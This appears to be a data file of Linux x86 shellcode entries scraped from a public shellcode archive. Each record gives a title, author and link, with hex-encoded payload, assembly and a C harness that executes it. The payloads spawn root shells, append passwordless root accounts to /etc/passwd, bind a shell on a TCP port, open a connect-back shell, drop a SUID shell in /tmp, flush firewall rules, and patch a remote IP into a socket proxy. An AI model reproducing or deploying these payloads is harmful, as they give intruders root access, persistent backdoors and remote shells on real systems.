"\tmovl %esi,0x8(%ebp)", "\txorl %eax,%eax", "\tmovb %eax,0x7(%esi)", "\tmovl %eax,0xc(%ebp)", "\tmovb $0xb,%al", "\tmovl %esi,%ebx", "\tleal 0x8(%ebp),%ecx\t", "\tleal 0xc(%ebp),%edx\t", "\tint  $0x80\t", "\tcall -0x1d", "\t.string \"/bin/sh\"", "*/", "", "#define NAME \"connecting\"", "", "char code[]=", "\"\\x89\\xe5\\x31\\xd2\\xb2\\x66\\x89\\xd0\\x31\\xc9\\x89\\xcb\\x43\\x89\\x5d\\xf8\"", "\"\\x43\\x89\\x5d\\xf4\\x4b\\x89\\x4d\\xfc\\x8d\\x4d\\xf4\\xcd\\x80\\x31\\xc9\\x89\"", "\"\\x45\\xf4\\x43\\x66\\x89\\x5d\\xec\\x66\\xc7\\x45\\xee\\x0f\\x27\\xc7\\x45\\xf0\"", "\"\\x7f\\x01\\x01\\x01\\x8d\\x45\\xec\\x89\\x45\\xf8\\xc6\\x45\\xfc\\x10\\x89\\xd0\"", "\"\\x43\\x8d\\x4d\\xf4\\xcd\\x80\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x03\"", "\"\\x75\\xf6\\xeb\\x18\\x5e\\x89\\x75\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x45\\x0c\"", "\"\\xb0\\x0b\\x89\\xf3\\x8d\\x4d\\x08\\x8d\\x55\\x0c\\xcd\\x80\\xe8\\xe3\\xff\\xff\"", "\"\\xff/bin/sh\";", "", "", "main()", "{", "  int (*funct)();", "  funct = (int (*)()) code;", "  printf(\"%s shellcode\\n\\tSize = %d\\n\",NAME,strlen(code));", "  (int)(*funct)();", "}"]},
{"Title": "Linux/x86 - Add Root User (w00w00) To /etc/passwd Shellcode (104 bytes)", "Author": "Shok", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-407.php", "View": null, "code": ["/*", "", "  jmp call_w00w00", "", "w00w00:", "  popl %edi", "  jmp w0w0w", "", "call_w00w00:", "", "  call w00w00", "", "w0w0w:", "", " # OPEN", " # ecx=flag (O_RDONLY, O_WRONLY, ...) ", " #     O_WRONLY | O_APPEND | O_CREAT = 0x441", " # edx=file mode", " # ebx=address of filename", " # eax=0x05 syscall number", "", "  xorl %ebx,%ebx", "  movb $(file-w0w0w),%bl", "  addl %edi,%ebx", "", "  xorb %al,%al", "  movb %al,11(%ebx)", "", "  xorl %ecx,%ecx", "  movw $0x441,%cx", "", "  xorl %edx,%edx", "  movw $00644,%dx", "", "  xorl %eax,%eax", "  movb $0x5,%al", "", "  int $0x80", "  movl %eax,%ebx    # save file descriptor to %ebx (for write)", " ", "#  WRITE", "#  ecx=address of buffer to write", "#  edx=number of bytes to write", "#  ebx=file descriptor", "#  eax=0x04", "  ", "  xorl %ecx,%ecx", "  movb $(string-w0w0w),%cl", "  addl %edi,%ecx", "", "  xorl %edx,%edx", "  movb $31,%dl", "", "  xorl %eax,%eax", "  movb $0x04,%al", "", "  int $0x80                                           ", "  ", "  xorl %eax,%eax", "  movb $1,%al", "  int $0x80", "  ", "file:  ", ".ascii \"/etc/passwd\"", "endfile:", ".byte 1 ", "string:", ".ascii \"w00w00::0:0:w0w0w!:/:/bin/sh\\n\"", "", "*/", "", "/* ", " * Source to this is pass.s", " * This will append a root line to the passwd file (see the source).", " *", " * Shok (Matt Conover), shok@dataforce.net", " */", "", "char shellcode[]=", "  \"\\xeb\\x03\\x5f\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x31\\xdb\\xb3\\x35\\x01\\xfb\"", "  \"\\x30\\xc0\\x88\\x43\\x0b\\x31\\xc9\\x66\\xb9\\x41\\x04\\x31\\xd2\\x66\\xba\\xa4\"", "  \"\\x01\\x31\\xc0\\xb0\\x05\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x41\\x01\\xf9\\x31\"", "  \"\\xd2\\xb2\\x1f\\x31\\xc0\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\\x2f\"", "  \"\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x01\\x77\\x30\\x30\\x77\\x30\"", "  \"\\x30\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x77\\x30\\x77\\x30\\x77\\x21\\x3a\\x2f\\x3a\"", "  \"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\";", "", "void main()", "{", "", "  int *ret;", "  ", "  printf(\"w00w00!\\n\");", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - Bind (64713/TCP) Shell (/bin/sh) Shellcode (83 bytes)", "Author": "storm", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-515.php", "View": null, "code": ["/*", " * (linux/x86) portbind /bin/sh (port 64713)", " * 83 bytes", " * ", " * http://www.gonullyourself.org", " * sToRm <hixmostorm@hotmail.com>", " */", "", "char shellcode[] =", "                                // <_start>:", "\"\\x6a\\x66\"                      // push   $0x66", "\"\\x58\"                          // pop    %eax", "\"\\x31\\xdb\"                      // xor    %ebx,%ebx", "\"\\x53\"                          // push   %ebx", "\"\\x43\"                          // inc    %ebx", "\"\\x53\"                          // push   %ebx", "\"\\x6a\\x02\"                      // push   $0x2", "\"\\x89\\xe1\"                      // mov    %esp,%ecx", "\"\\xcd\\x80\"                      // int    $0x80", "\"\\x31\\xd2\"                      // xor    %edx,%edx", "\"\\x52\"                          // push   %edx", "\"\\x68\\xff\\x02\\xfc\\xc9\"          // push   $0xc9fc02ff", "\"\\x89\\xe1\"                      // mov    %esp,%ecx", "\"\\x6a\\x10\"                      // push   $0x10", "\"\\x51\"                          // push   %ecx", "\"\\x50\"                          // push   %eax", "\"\\x89\\xe1\"                      // mov    %esp,%ecx", "\"\\x89\\xc6\"                      // mov    %eax,%esi", "\"\\x43\"                          // inc    %ebx", "\"\\xb0\\x66\"                      // mov    $0x66,%al", "\"\\xcd\\x80\"                      // int    $0x80", "\"\\xb0\\x66\"                      // mov    $0x66,%al", "\"\\x43\"                          // inc    %ebx", "\"\\x43\"                          // inc    %ebx", "\"\\xcd\\x80\"                      // int    $0x80", "\"\\x50\"                          // push   %eax", "\"\\x56\"                          // push   %esi", "\"\\x89\\xe1\"                      // mov    %esp,%ecx", "\"\\x43\"                          // inc    %ebx", "\"\\xb0\\x66\"                      // mov    $0x66,%al", "\"\\xcd\\x80\"                      // int    $0x80", "\"\\x93\"                          // xchg   %eax,%ebx", "\"\\x6a\\x03\"                      // push   $0x3", "\"\\x59\"                          // pop    %ecx", "                                // <fruity_loops>:", "\"\\x49\"                          // dec    %ecx", "\"\\x6a\\x3f\"                      // push   $0x3f", "\"\\x58\"                          // pop    %eax", "\"\\xcd\\x80\"                      // int    $0x80", "\"\\x75\\xf8\"                      // jne    <fruity_loops>", "\"\\xf7\\xe1\"                      // mul    %ecx", "\"\\x51\"                          // push   %ecx", "\"\\x68\\x2f\\x2f\\x73\\x68\"          // push   $0x68732f2f", "\"\\x68\\x2f\\x62\\x69\\x6e\"          // push   $0x6e69622f", "\"\\x89\\xe3\"                      // mov    %esp,%ebx", "\"\\xb0\\x0b\"                      // mov    $0xb,%al", "\"\\xcd\\x80\"                      // int    $0x80", ";", "", "int main() {", "", "    int (*f)() = (int(*)())shellcode;", "    printf(\"Length: %u\\n\", strlen(shellcode));", "    f();", "    ", "}"]},
{"Title": "Linux/x86 - setuid(0) + execve(\"/bin/sh\",0,0) Shellcode (28 bytes)", "Author": "storm", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-516.php", "View": null, "code": ["/*", " * (linux/x86) setuid(0) & execve(\"/bin/sh\",0,0) ", " * 28 bytes", " * ", " * http://www.gonullyourself.org", " * sToRm <hixmostorm@hotmail.com>", " * ", " * I made this, because http://www.milw0rm.com/shellcode/7115 felt the need", " * to express his \"superior\" 28-byte shellcode in all caps.  I wasn't able", " * to beat his code, but it's no longer special.", " */", "", "char shellcode[] =", "                                // <_start>:", "    \"\\x31\\xdb\"                  // xor    %ebx,%ebx", "    \"\\x6a\\x17\"                  // push   $0x17", "    \"\\x58\"                      // pop    %eax", "    \"\\xcd\\x80\"                  // int    $0x80", "    \"\\xf7\\xe3\"                  // mul    %ebx", "    \"\\xb0\\x0b\"                  // mov    $0xb,%al", "    \"\\x31\\xc9\"                  // xor    %ecx,%ecx", "    \"\\x51\"                      // push   %ecx", "    \"\\x68\\x2f\\x2f\\x73\\x68\"      // push   $0x68732f2f", "    \"\\x68\\x2f\\x62\\x69\\x6e\"      // push   $0x6e69622f", "    \"\\x89\\xe3\"                  // mov    %esp,%ebx", "    \"\\xcd\\x80\"                  // int    $0x80", ";", "", "int main() {", "", "    int (*f)() = (int(*)())shellcode;", "    printf(\"Length: %u\\n\", strlen(shellcode));", "    f();", "    ", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh,0,0) Shellcode (21 bytes)", "Author": "storm", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-517.php", "View": null, "code": ["/*", " * (linux/x86) execve(\"/bin/sh\",0,0) ", " * 21 bytes", " * ", " * http://www.gonullyourself.org", " * sToRm <hixmostorm@hotmail.com>", " */", "", "char shellcode[] =", "                                // <_start>", "    \"\\x31\\xc9\"                  // xor    %ecx,%ecx", "    \"\\xf7\\xe1\"                  // mul    %ecx", "    \"\\x51\"                      // push   %ecx", "    \"\\x68\\x2f\\x2f\\x73\\x68\"      // push   $0x68732f2f", "    \"\\x68\\x2f\\x62\\x69\\x6e\"      // push   $0x6e69622f", "    \"\\x89\\xe3\"                  // mov    %esp,%ebx", "    \"\\xb0\\x0b\"                  // mov    $0xb,%al", "    \"\\xcd\\x80\"                  // int    $0x80", ";", "", "int main() {", "", "    int (*f)() = (int(*)())shellcode;", "    printf(\"Length: %u\\n\", strlen(shellcode));", "    f();", "    ", "}"]},
{"Title": "Linux/x86 - fork() + setreuid(0, 0) + execve(cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh) Shellcode (126 bytes)", "Author": "anonymous", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-540.php", "View": null, "code": ["/* ", "   linux/x86 (shamelessly ripped from one of my unpublished exploits)", "*/", "/*", "   fork()'s, does setreuid(0, 0); then execve()'s:", "     /bin/sh -c \"cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh\"", "  ", "   hence dropping a SUID root shell in /tmp.", "*/", "", "char shellc[] =", "/* Shellcode to drop a SUID root shell in /tmp/sh. ", "   Forgive the Intel syntax in the commenting, bored with AT&T syntax..", " */", "", "/* main: if (fork()) goto exeunt; else goto carryon; */", "\"\\x29\\xc0\"                                 /* sub ax, ax               */", "\"\\xb0\\x02\"                                 /* mov al, 2                */", "\"\\xcd\\x80\"                                 /* int 0x80                 */", "\"\\x85\\xc0\"                                 /* test ax, ax              */", "\"\\x75\\x02\"                                 /* jnz exeunt               */", "\"\\xeb\\x05\"                                 /* jmp carryon              */", "", "/* exeunt: exit(x); */", "\"\\x29\\xc0\"                                 /* sub ax, ax               */", "\"\\x40\"                                     /* inc ax                   */", "\"\\xcd\\x80\"                                 /* int 0x80                 */", "", "/* carryon: setreuid(0, 0); goto callz; */", "\"\\x29\\xc0\"                                 /* sub ax, ax               */", "\"\\x29\\xdb\"                                 /* sub bx, bx               */", "\"\\x29\\xc9\"                                 /* sub cx, cx               */", "\"\\xb0\\x46\"                                 /* mov al, 0x46             */", "\"\\xcd\\x80\"                                 /* int 0x80                 */", "\"\\xeb\\x2a\"                                 /* jmp callz                */", "", "/* start: execve() */", "\"\\x5e\"                                     /* pop si                   */", "\"\\x89\\x76\\x32\"                             /* mov [bp+0x32], si        */", "\"\\x8d\\x5e\\x08\"                             /* lea bx, [bp+0x08]        */", "\"\\x89\\x5e\\x36\"                             /* mov [bp+0x36], bx        */", "\"\\x8d\\x5e\\x0b\"                             /* lea bx, [bp+0x0b]        */", "\"\\x89\\x5e\\x3a\"                             /* mov [bp+0x3a], bx        */", "\"\\x29\\xc0\"                                 /* sub ax, ax               */", "\"\\x88\\x46\\x07\"                             /* mov [bp+0x07], al        */", "\"\\x88\\x46\\x0a\"                             /* mov [bp+0x0a], al        */", "\"\\x88\\x46\\x31\"                             /* mov [bp+0x31], al        */", "\"\\x89\\x46\\x3e\"                             /* mov [bp+0x3e], ax        */", "\"\\x87\\xf3\"                                 /* xchg si, bx              */", "\"\\xb0\\x0b\"                                 /* mov al, 0x0b             */", "\"\\x8d\\x4b\\x32\"                             /* lea cx, [bp+di+0x32]     */", "\"\\x8d\\x53\\x3e\"                             /* lea dx, [bp+di+0x3e]     */", "\"\\xcd\\x80\"                                 /* int 0x80                 */", "", "/* callz: call start */", "\"\\xe8\\xd1\\xff\\xff\\xff\"                     /* call start               */", "", "/* data - command to execve() */", "\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x2d\\x63\\x20\\x63\\x70\\x20\\x2f\\x62\\x69\\x6e\\x2f\"", "\"\\x73\\x68\\x20\\x2f\\x74\\x6d\\x70\\x2f\\x73\\x68\\x3b\\x20\\x63\\x68\\x6d\\x6f\\x64\\x20\\x34\"", "\"\\x37\\x35\\x35\\x20\\x2f\\x74\\x6d\\x70\\x2f\\x73\\x68\";", "", "/** test out the shellcode **/", "main ()", "{", "  void (*sc)() = (void *)shellc; sc();", "}"]},
{"Title": "Linux/x86 - Add Root User (w000t) + No Password Shellcode (177 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-543.php", "View": null, "code": ["Linux x86 shellcode that uses execve and echo >> to create a passwordless", "root account.", "", "", "Author: zillion", "Email : zillion@safemode.org", "Homepage: safemode.org", "File: w000t-shell.c", "", "", "", "/*", " * This shellcode will add a passwordless local root account 'w000t'", " * Written by zillion@safemode.org", " *", " * Why so big ? it uses execve ;-)", " */", "", "char shellcode[]=", "        \"\\xeb\\x2a\\x5e\\x31\\xc0\\x88\\x46\\x07\\x88\\x46\\x0a\\x88\\x46\\x47\\x89\"", "        \"\\x76\\x49\\x8d\\x5e\\x08\\x89\\x5e\\x4d\\x8d\\x5e\\x0b\\x89\\x5e\\x51\\x89\"", "        \"\\x46\\x55\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x49\\x8d\\x56\\x55\\xcd\\x80\\xe8\"", "        \"\\xd1\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x23\\x2d\\x63\\x23\"", "        \"\\x2f\\x62\\x69\\x6e\\x2f\\x65\\x63\\x68\\x6f\\x20\\x77\\x30\\x30\\x30\\x74\"", "        \"\\x3a\\x3a\\x30\\x3a\\x30\\x3a\\x73\\x34\\x66\\x65\\x6d\\x30\\x64\\x65\\x3a\"", "        \"\\x2f\\x72\\x6f\\x6f\\x74\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68\"", "        \"\\x20\\x3e\\x3e\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"", "        \"\\x23\\x41\\x41\\x41\\x41\\x42\\x42\\x42\\x42\\x43\\x43\\x43\\x43\\x44\\x44\"", "        \"\\x44\\x44\";", "", "", "", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - execve(/sbin/ipchains -F) Shellcode (70 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-544.php", "View": null, "code": ["Author: zillion", "Email: zillion@safemode.org", "Homepage: http://www.safemode.org", "", "", "Linux x86 shell code that does an execve of /sbin/ipchains -F", "", "", "File name: flush-ipchains-shellcode.c", "", "", "/*", " * This shellcode will do /sbin/ipchains -F", " * Written by zillion@safemode.org", " *", " */", "", "char shellcode[]=", "        \"\\xeb\\x21\\x5e\\x31\\xc0\\x88\\x46\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "        \"\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "        \"\\x8d\\x56\\x1a\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\"", "        \"\\x2f\\x69\\x70\\x63\\x68\\x61\\x69\\x6e\\x73\\x38\\x2d\\x46\\x32\\x33\\x34\"", "        \"\\x35\\x36\\x37\\x38\\x39\\x61\\x62\\x63\\x64\\x65\";", "", "", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - execve(/sbin/iptables -F) Shellcode (70 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-545.php", "View": null, "code": ["Author: zillion", "Email: zillion@safemode.org", "Home: http://www.safemode.org", "", "Linux x86 shellcode that does an execve() of /sbin/iptables -F in order to", "flush activated firewall rules.", "", "", "File: flush-iptables-shell.c", "", "/*", " * This shellcode will do /sbin/iptables -F", " * Written by zillion@safemode.org", " *", " */", "", "char shellcode[]=", "        \"\\xeb\\x21\\x5e\\x31\\xc0\\x88\\x46\\x0e\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "        \"\\x5e\\x0f\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "        \"\\x8d\\x56\\x1a\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\\x2f\\x73\\x62\\x69\\x6e\"", "        \"\\x2f\\x69\\x70\\x74\\x61\\x62\\x6c\\x65\\x73\\x38\\x2d\\x46\\x32\\x33\\x34\"", "        \"\\x35\\x36\\x37\\x38\\x39\\x61\\x62\\x63\\x64\\x65\";", "", "", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh /tmp/p00p) Shellcode (70 bytes)", "Author": "zillion", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-546.php", "View": null, "code": ["Author: zillion", "EMail: zillion@safemode.org", "Home: http://www.safemode.org", "", "", "Linux x86 shellcode that does an execve of /bin/sh /tmp/p00p.", "", "", "File name: execve-tmp-p00p.c", "", "", "/*", " * This shellcode will do /bin/sh /tmp/p00p ;-)", " * Written by zillion@safemode.org", " *", " */", "", "char shellcode[]=", "        \"\\xeb\\x21\\x5e\\x31\\xc0\\x88\\x46\\x07\\x88\\x46\\x11\\x89\\x76\\x12\\x8d\"", "        \"\\x5e\\x08\\x89\\x5e\\x16\\x89\\x46\\x1a\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x12\"", "        \"\\x8d\\x56\\x1a\\xcd\\x80\\xe8\\xda\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\"", "        \"\\x73\\x68\\x38\\x2f\\x74\\x6d\\x70\\x2f\\x70\\x30\\x30\\x70\\x32\\x33\\x34\"", "        \"\\x35\\x36\\x37\\x38\\x39\\x61\\x62\\x63\\x64\\x65\";", "", "int main()", "{", "", "  int *ret;", "  ret = (int *)&ret + 2;", "  (*ret) = (int)shellcode;", "}"]},
{"Title": "Linux/x86 - execve(/bin/ash) + exit() Shellcode (34 bytes)", "Author": "bob", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-547.php", "View": null, "code": ["/*", " * Linux x86 shellcode by bob from Dtors.net.", " * execve()/bin/ash; exit; ", " * Total = 34 bytes.", " */", "", "", "", "#include <stdio.h>", "", "char shellcode[]=", "\t\t\"\\x31\\xc0\\x50\\x68\\x2f\\x61\\x73\\x68\\x68\"", "\t\t\"\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x8d\\x54\\x24\"", "\t\t\"\\x08\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\"", "\t\t\"\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\";", "int", "main()", "{", "        void (*dsr) ();", "        (long) dsr = &shellcode;", "        printf(\"Size: %d bytes.\\n\", sizeof(shellcode)); ", "        dsr();", "}"]},
{"Title": "Linux/x86 - Add Root User To /etc/passwd + No Password + exit() Shellcode (83 bytes)", "Author": "bob", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-548.php", "View": null, "code": ["/* Linux x86 shellcode, to open() write() close() and */", "/* exit(), adds a root user no-passwd to /etc/passwd */", "/* By bob from dtors.net */", "", "#include <stdio.h>", "", "char shellcode[]=", "\t\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x53\\x68\\x73\\x73\\x77\"", "\t\t\"\\x64\\x68\\x63\\x2f\\x70\\x61\\x68\\x2f\\x2f\\x65\\x74\"", "\t\t\"\\x89\\xe3\\x66\\xb9\\x01\\x04\\xb0\\x05\\xcd\\x80\\x89\"", "\t\t\"\\xc3\\x31\\xc0\\x31\\xd2\\x68\\x6e\\x2f\\x73\\x68\\x68\"", "\t\t\"\\x2f\\x2f\\x62\\x69\\x68\\x3a\\x3a\\x2f\\x3a\\x68\\x3a\"", "\t\t\"\\x30\\x3a\\x30\\x68\\x62\\x6f\\x62\\x3a\\x89\\xe1\\xb2\"", "\t\t\"\\x14\\xb0\\x04\\xcd\\x80\\x31\\xc0\\xb0\\x06\\xcd\\x80\"", "\t\t\"\\x31\\xc0\\xb0\\x01\\xcd\\x80\";", "", "int", "main()", "{", "        void (*dsr) ();", "        (long) dsr = &shellcode;", "        printf(\"Size: %d bytes.\\n\", sizeof(shellcode)); ", "        dsr();", "}"]},
{"Title": "Linux/x86 - setuid() + execve() + exit() Shellcode (44 bytes)", "Author": "bob", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-549.php", "View": null, "code": ["/* Linux x86 shellcode by bob */", "/* setuid(); execve(); exit(); */", "", "#include <stdio.h>", "", "char shellcode[]=", "\t\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x17\\xcd\\x80\"", "\t\t\"\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\"", "\t\t\"\\x2f\\x62\\x69\\x89\\xe3\\x8d\\x54\\x24\\x08\\x50\"", "\t\t\"\\x53\\x8d\\x0c\\x24\\xb0\\x0b\\xcd\\x80\\x31\\xc0\"", "\t\t\"\\xb0\\x01\\xcd\\x80\";", "int", "main()", "{", "        void (*dsr) ();", "        (long) dsr = &shellcode;", "        printf(\"Size: %d bytes.\\n\", sizeof(shellcode)); ", "        dsr();", "}"]},
{"Title": "Linux/x86 - chmod(/bin/sh,04775) + set sh +s Shellcode (31 bytes)", "Author": "bob", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-550.php", "View": null, "code": ["/*", " * Linux x86 shellcode by bob from Dtors.net.", " * chmod(\"//bin/sh\" ,04775); set sh +s", " */", "", "", "", "#include <stdio.h>", "", "char shellcode[]=", "\t\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x53\\x68\\x6e\"", "\t\t\"\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\"", "\t\t\"\\xe3\\x66\\xb9\\xfd\\x09\\xb0\\x0f\\xcd\\x80\"", "\t\t\"\\xb0\\x01\\xcd\\x80\";", "int", "main()", "{", "        void (*dsr) ();", "        (long) dsr = &shellcode;", "        printf(\"Size: %d bytes.\\n\", sizeof(shellcode)); ", "        dsr();", "}"]},
{"Title": "Linux/x86 - Socket-proxy Shellcode (372 bytes) (Generator)", "Author": "Russell Sanford", "Published": ": 2009-01-01", "Platform": "Generator", "Download": "http://shell-storm.org/shellcode/files/shellcode-56.php", "View": null, "code": ["/*---------------------------------------------------------------------------*", " *                372 byte socket-proxy shellcode                            *", " *              by Russell Sanford - xort@tty64.org                          *", " *---------------------------------------------------------------------------*", " *    filename: x86-linux-bounce-proxy.c                                     *", " *        date: 12/23/2005                                                   *", " *        info: Compiled with DTP Project.                                   *", " * discription: This is a x86-linux proxy shellcode. This is probably best   *", " * \t        used in stage 2 situations. The syntax for invoking the      *", " * \t        patchcode is as follows:                                     *", " *                                                                           *", " * \t\tpatchcode(shellcode,31337,\"11.22.33.44\",80);                 *", " *                                                                           *", " * \t\tWhere 31337 is the port to listen to on the remote host      *", " *---------------------------------------------------------------------------*/", "", "char shellcode[] =", "\"\\xe8\\xff\\xff\\xff\\xff\\xc6\\x4e\\x5e\\x81\\xc6\\x18\\xfc\\xff\\xff\\xeb\\x48\\x89\\xc3\\x6a\\x03\\x59\\xb0\\xdd\\xcd\"", "\"\\x80\\x56\\x89\\xde\\x80\\xcc\\x08\\x6a\\x04\\x59\\xb0\\xdd\\xcd\\x80\\x93\\x5e\\xc3\\x89\\xc2\\x83\\xe0\\x1f\\xc1\\xea\"", "\"\\x05\\x8d\\x8e\\x78\\xff\\xff\\xff\\x0f\\xab\\x04\\x91\\xc3\\x93\\xb0\\x03\\x8d\\x8e\\x48\\xf4\\xff\\xff\\x66\\xba\\x01\"", "\"\\x08\\xcd\\x80\\xc3\\x93\\xb0\\x04\\x8d\\x8e\\x48\\xf4\\xff\\xff\\xcd\\x80\\xc3\\x8d\\xbe\\xf8\\xfe\\xff\\xff\\x31\\xc0\"", "\"\\x31\\xc9\\x66\\xb9\\x01\\x01\\xf3\\xaa\\x31\\xc0\\x6a\\x01\\x5b\\x50\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\"", "\"\\x5a\\x68\\x7e\\xff\\xfe\\xff\\x81\\x04\\x24\\x01\\x01\\x01\\x01\\x68 xor\\x81\\x04\\x24t@tt\\x6a\\x10\\x51\\x50\\x89\"", "\"\\xe1\\xb0\\x66\\xcd\\x80\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x5a\\x50\\x50\\x52\\x89\\xe1\\xfe\\xc3\\xb0\\x66\\xcd\\x80\\x89\"", "\"\\x46\\xfc\\xe8\\x5b\\xff\\xff\\xff\\xe8\\x6f\\xff\\xff\\xff\\x31\\xc0\\x6a\\x01\\x5b\\x50\\x53\\x6a\\x02\\x89\\xe1\\xb0\"", "\"\\x66\\xcd\\x80\\x5b\\x43\\x5f\\x68y64.\\x81\\x04\\x24org \\x68need\\x81\\x04\\x24 job\\x6a\\x10\\x51\\x50\\x89\\xe1\"", "\"\\xb0\\x66\\xcd\\x80\\x58\\x89\\x46\\xf8\\xe8\\x19\\xff\\xff\\xff\\xe8\\x2d\\xff\\xff\\xff\\x8b\\x5e\\xfc\\x8b\\x4e\\xf8\"", "\"\\x6a\\x01\\x53\\x51\\x6a\\x02\\x51\\x53\\x39\\xd9\\x7e\\x02\\x89\\xcb\\x56\\x43\\x8d\\x8e\\x78\\xff\\xff\\xff\\x31\\xd2\"", "\"\\x31\\xf6\\x31\\xff\\xb0\\x8e\\xcd\\x80\\x5e\\x58\\x50\\x89\\xc2\\x83\\xe0\\x1f\\xc1\\xea\\x05\\x8d\\x8e\\x78\\xff\\xff\"", "\"\\xff\\x0f\\xa3\\x04\\x91\\x73\\x04\\x59\\x59\\xeb\\x32\\x58\\x50\\xe8\\xe5\\xfe\\xff\\xff\\x58\\x31\\xff\\x47\\x83\\x7c\"", "\"\\x24\\x04\\x02\\x74\\x02\\xf7\\xdf\\x01\\xf8\\xe8\\xe4\\xfe\\xff\\xff\\x39\\xc0\\x89\\xc2\\x58\\x31\\xff\\x47\\x83\\x3c\"", "\"\\x24\\x02\\x75\\x02\\xf7\\xdf\\x01\\xf8\\xe8\\xdd\\xfe\\xff\\xff\\x59\\xe2\\xb1\\xeb\\x88\";", "", "int find_safe_offset(int INT_A) {", "", "\tint INT_B=0;", "\t", "\tdo {", "\t\tINT_A -= 0x01010101;\tINT_B += 0x01010101;", "\t}", "\twhile ( ((INT_A & 0x000000ff) == 0) || ", "\t\t((INT_A & 0x0000ff00) == 0) || ", "\t\t((INT_A & 0x00ff0000) == 0) ||", "\t\t((INT_A & 0xff000000) == 0) );", "", "\treturn INT_B;", "}", "", "void patchcode(char *shellcode, int PORT_IN, char *IP, int PORT_OUT) {", "\t", "\tint PORT_IN_A = ((ntohs(PORT_IN) << 16) + 2);", "\tint PORT_IN_B = find_safe_offset(PORT_IN_A);\t", "", "\tint IP_A = inet_addr(IP);", "\tint IP_B = find_safe_offset(IP_A);", "", "\tint PORT_OUT_A = ((ntohs(PORT_OUT) << 16) + 2);", "\tint PORT_OUT_B = find_safe_offset(PORT_OUT_A);\t", "", "\t*(int *)&shellcode[134] = (PORT_IN_A - PORT_IN_B);", "\t*(int *)&shellcode[141] = PORT_IN_B;", "", "\t*(int *)&shellcode[205] = (IP_A - IP_B);", "\t*(int *)&shellcode[212] = IP_B;", "\t", "\t*(int *)&shellcode[217] = (PORT_OUT_A - PORT_OUT_B);", "\t*(int *)&shellcode[224] = PORT_OUT_B;", "", "}"]},
